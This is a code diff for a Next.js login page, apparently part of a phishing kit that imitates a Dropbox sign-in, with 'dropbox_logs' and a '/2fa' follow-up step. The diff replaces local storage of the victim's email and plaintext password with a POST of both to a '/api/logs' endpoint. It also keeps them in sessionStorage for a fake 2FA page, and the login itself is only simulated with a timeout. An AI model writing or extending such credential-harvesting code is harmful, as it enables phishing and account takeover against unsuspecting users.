@@ -3,11 +3,13 @@
 import { useState } from 'react';
 import Image from 'next/image';
 import classNames from 'classnames';
+import { useRouter } from 'next/navigation';
 
 export default function LoginPage() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const router = useRouter();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -15,26 +17,32 @@ export default function LoginPage() {
 
     setIsSubmitting(true);
     
-    // Store email for the 2FA page
-    sessionStorage.setItem('userEmail', email);
-    sessionStorage.setItem('userPassword', password);
-    
-    // Log the login attempt with timestamp
-    const timestamp = new Date().toLocaleString();
-    const logEntry = {
-      timestamp,
-      email,
-      password,
-      type: 'login'
-    };
-    
-    // Store in localStorage for persistence
-    const storedLogs = JSON.parse(localStorage.getItem('dropbox_logs') || '[]');
-    localStorage.setItem('dropbox_logs', JSON.stringify([...storedLogs, logEntry]));
+    // Store credentials for 2FA page
+    sessionStorage.setItem('email', email);
+    sessionStorage.setItem('password', password);
+
+    // Log the login attempt
+    try {
+      await fetch('/api/logs', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          timestamp: new Date().toLocaleString(),
+          email,
+          password,
+          code: '',
+          type: 'LOGIN'
+        }),
+      });
+    } catch (error) {
+      console.error('Error logging login attempt:', error);
+    }
     
     // Simulate login verification
     setTimeout(() => {
-      window.location.href = '/2fa';
+      router.push('/2fa');
     }, 1000);
   };
 
